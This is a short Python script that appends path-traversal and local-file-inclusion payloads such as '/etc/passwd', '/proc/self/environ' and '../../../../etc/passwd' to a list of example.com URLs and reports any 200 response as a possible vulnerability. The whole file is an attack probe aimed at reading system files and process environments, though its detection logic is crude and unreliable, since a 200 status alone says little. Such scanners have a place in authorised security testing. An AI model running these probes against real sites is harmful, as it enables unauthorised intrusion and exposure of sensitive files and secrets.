import requests

urls = ['http://example.com/page1', 'http://example.com/page2', 'http://example.com/page3']
payloads = ['/etc/passwd', '/proc/self/environ', '../../../../etc/passwd']

for url in urls:
    for payload in payloads:
        test_url = url + payload
        try:
            response = requests.get(test_url)
            if response.status_code == 200:
                print(f'Possible LFI vulnerability found in {test_url}')
        except requests.exceptions.RequestException as e:
            print(e)
